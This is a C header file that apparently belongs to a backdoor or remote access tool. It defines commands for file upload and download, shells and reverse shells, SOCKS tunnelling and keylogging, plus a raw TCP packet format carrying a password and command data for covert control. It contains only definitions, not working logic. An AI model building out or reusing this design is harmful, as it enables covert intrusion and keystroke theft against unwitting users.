#ifndef ACTIONS_H
#define ACTIONS_H

#include <netinet/ip.h>
#include <netinet/tcp.h>

// actions
#define UPLOAD      1
#define DOWNLOAD    2
#define SHELL       3
#define CHECK       4
#define LISTEN      5
#define RUPLOAD     6
#define RDOWNLOAD   7
#define RSHELL      8
#define DIRECTRAW   9
#define SOCKS       10
#define RSOCKS      11
#define SKEYLOG     12
#define KKEYLOG     13
#define START       14
#define STOP        15

// connection type
#define RAW         1
#define TCP         2
#define RTCP        3

// services
#define KEYLOG      1

#define BUFSIZE 256
#define WCHAR 0x0c
#define ECHAR 0x0b

int grantpt (int fd) __THROW;
int unlockpt (int fd) __THROW;
char *ptsname (int fd) __THROW;

struct data {
    unsigned char pass[20];
    unsigned short port;
    unsigned char action;
    unsigned char subaction;
    unsigned long size;
    unsigned char bytes[BUFSIZE];
} __attribute__ ((packed));

struct packet {
    struct ip ip;
    struct tcphdr tcp;
    unsigned char options[12];
    struct data action;
} __attribute__ ((packed));

#endif
